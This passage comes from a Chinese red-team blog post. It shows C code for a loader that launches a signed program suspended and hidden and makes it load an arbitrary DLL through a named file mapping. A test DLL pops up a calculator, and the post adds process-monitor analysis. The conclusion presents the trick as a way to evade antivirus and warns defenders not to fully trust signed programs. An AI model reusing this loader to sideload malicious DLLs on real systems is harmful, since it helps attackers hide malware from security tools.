+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>BOOL</span> <span class=n>bStatus</span> <span class=o>=</span> <span class=nf>CreateProcessW</span><span class=p>(</span><span class=n>loaderPath</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>FALSE</span><span class=p>,</span> <span class=n>CREATE_SUSPENDED</span><span class=o>|</span> <span class=n>CREATE_NO_WINDOW</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>si</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>pi</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>bStatus</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=cm>/*wprintf(L&#34;[-] CreateProcess Error %d \n&#34;, GetLastError());*/</span>
+</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=nf>ZeroMemory</span><span class=p>(</span><span class=n>szName</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>szName</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=nf>wsprintfW</span><span class=p>(</span><span class=n>szName</span><span class=p>,</span> <span class=sa>L</span><span class=s>&#34;Local</span><span class=se>\\</span><span class=s>szLibraryName%X&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>pi</span><span class=p>.</span><span class=n>dwProcessId</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>hFileMap</span> <span class=o>=</span> <span class=nf>CreateFileMappingW</span><span class=p>(</span><span class=n>hFile</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>attributes</span><span class=p>,</span> <span class=n>PAGE_READWRITE</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1024</span><span class=p>,</span> <span class=n>szName</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=nf>ResumeThread</span><span class=p>(</span><span class=n>pi</span><span class=p>.</span><span class=n>hThread</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=nf>Sleep</span><span class=p>(</span><span class=mi>3000</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>编写一个dll文件用于测试：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=c1>// dllmain.cpp : 定义 DLL 应用程序的入口点。
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&#34;pch.h&#34;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>BOOL</span> <span class=n>APIENTRY</span> <span class=nf>DllMain</span><span class=p>(</span> <span class=n>HMODULE</span> <span class=n>hModule</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                       <span class=n>DWORD</span>  <span class=n>ul_reason_for_call</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                       <span class=n>LPVOID</span> <span class=n>lpReserved</span>
+</span></span><span class=line><span class=cl>                     <span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>switch</span> <span class=p>(</span><span class=n>ul_reason_for_call</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>DLL_PROCESS_ATTACH</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1>// 弹出一个计算器
+</span></span></span><span class=line><span class=cl>        <span class=n>WinExec</span><span class=p>(</span><span class=s>&#34;calc.exe&#34;</span><span class=p>,</span> <span class=n>TRUE</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>DLL_THREAD_ATTACH</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>DLL_THREAD_DETACH</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>DLL_PROCESS_DETACH</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>TRUE</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
 </span></span></code></pre></div><h2 id=0x03-加载任意dll测试>0x03 加载任意dll测试</h2><p><a href=https://images.payloads.online/2022-08-17-15-51-15.png data-fancybox=gallery data-caption><img src=https://images.payloads.online/2022-08-17-15-51-15.png alt></a></p><p>双击Invoke-Loader.exe，就会弹出计算器：</p><p><a href=https://images.payloads.online/2022-08-17-15-51-29.png data-fancybox=gallery data-caption><img src=https://images.payloads.online/2022-08-17-15-51-29.png alt></a></p><p>通过ProcessMonitor分析一下过程是不是如我所想的那样：</p><p><a href=https://images.payloads.online/2022-08-17-15-51-41.png data-fancybox=gallery data-caption><img src=https://images.payloads.online/2022-08-17-15-51-41.png alt></a></p><p>首先创建了2.log，内容是DllMain.dll的绝对路径，然后再创建loaddll.exe：</p><p><a href=https://images.payloads.online/2022-08-17-15-51-52.png data-fancybox=gallery data-caption><img src=https://images.payloads.online/2022-08-17-15-51-52.png alt></a></p><p>主线程创建的时候因为是暂停状态，是没有加载任何dll的，当文件映射设置完毕，恢复线程状态后，它成功的加载了DllMain.dll。
 <a href=https://images.payloads.online/2022-08-17-15-52-04.png data-fancybox=gallery data-caption><img src=https://images.payloads.online/2022-08-17-15-52-04.png alt></a></p><p><a href=https://images.payloads.online/2022-08-17-15-52-14.png data-fancybox=gallery data-caption><img src=https://images.payloads.online/2022-08-17-15-52-14.png alt></a></p><p>这里的calc.exe的父进程是loaddll.exe。</p><h2 id=0x04-总结>0x04 总结</h2><p><a href=https://images.payloads.online/2022-08-17-15-52-37.png data-fancybox=gallery data-caption><img src=https://images.payloads.online/2022-08-17-15-52-37.png alt></a></p><p>该程序上次更新已经是2020年了，可能已经被大范围滥用。</p><p><a href=https://images.payloads.online/2022-08-17-15-52-47.png data-fancybox=gallery data-caption><img src=https://images.payloads.online/2022-08-17-15-52-47.png alt></a></p><p>白加黑是一个降低红队攻击成本的一个方案，能够规避很多杀毒软件的拦截和扫描，在应急响应阶段对于签名程序的分析应更加关注签名程序加载的模块、进程行为做了哪些操作，签名验证仅仅是提高了攻击的门槛，不应该绝对信任签名程序。</p></section><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://payloads.online/archivers/2022-09-03/1/><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>分享一下最近使用Arch Linux的感受</span></a><a class="justify-end pl-3 ltr:ml-auto rtl:mr-auto" href=https://payloads.online/archivers/2022-08-11/1/><span>通过动态链接库绕过反病毒软件Hook - Break JVM</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a></nav><div class="giscus mt-24"></div><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=1 data-reactions-enabled=0 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><script src=/js/fancybox.umd.js></script><script>Fancybox.bind('[data-fancybox="gallery"]',{})</script><script src=/js/pangu.min.js></script><script>document.addEventListener("DOMContentLoaded",()=>{pangu.spacingElementByClassName("prose")})</script><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>倾旋 All rights reserved</div><nav class="flex items-center"><a class="link footer-link" href=/links/>友情链接</a><a class="link footer-link" href=/message>留言</a><a class="link footer-link" href=/sponsor>赞助</a><a class="link footer-link" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugo️️</a></nav></footer></body></html>
